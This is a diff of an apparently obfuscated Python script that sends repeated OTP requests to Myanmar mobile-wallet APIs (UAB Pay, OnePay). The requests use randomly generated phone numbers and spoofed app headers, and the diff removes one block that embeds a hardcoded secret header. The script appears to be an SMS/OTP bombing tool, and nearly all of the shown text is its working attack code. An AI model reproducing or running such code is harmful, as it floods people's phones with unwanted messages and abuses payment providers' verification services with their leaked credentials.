@@ -121,18 +121,6 @@ def hanazakari():
     payload = {"PhoneNo":msidg('9597'),"type":1,"app_version": "1.10.1"}
     boo = json.dumps(payload)
     sakura(url, headers, b, boo)
-    url = 'https://api.uabpaybusiness.com/API/Wallet/Wallet_SendTempOTP'
-    headers = {"Accept":"application/json","User-Agent":"uabpay/2.0.0 API","Secret-Code":"7B20K06[-GHC?X=K8SZ[#G759PRA<6%Z)*0C`64U","Content-Type":"application/json","Content-Length":"97","Accept-Encoding":"gzip, deflate, br"}
-    payload = {"AppVersion":"3.1.4","MobileNo":kasumi(msidg('096')),"AppType":"YoRz8UKperorlMt3qW0ZQg=="}
-    boo = json.dumps(payload)
-    sakura(url, headers, b, boo)
-    payload = {"AppVersion":"3.1.4","MobileNo":kasumi(msidg('095')),"AppType":"YoRz8UKperorlMt3qW0ZQg=="}
-    boo = json.dumps(payload)
-    sakura(url, headers, b, boo)
-    payload = {"AppVersion":"3.1.4","MobileNo":kasumi(msidg('097')),"AppType":"YoRz8UKperorlMt3qW0ZQg=="}
-    boo = json.dumps(payload)
-    sakura(url, headers, b, boo)
-    url = 'https://onepay.mobi/API/Wallet/Wallet_SendLoginOTPV2'
     headers = {"Accept":"application/json","Content-Type":"application/json","Content-Length":"130","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.2","Connection":"keep-alive"}
     ustringer = grhs(16) + random.choice(['11Mo', '11Tu', '11We', '11Th', '11Fr', '11Su', '11Sa']) +"2025"+str(random.randint(10,24))+str(random.randint(10,59))+str(random.randint(100000,900000))
     payload = {"MobileNo":kumo(msidg('9596')),"UserType":"wJcVk3q9PLQ=","UID":kumo(ustringer)}
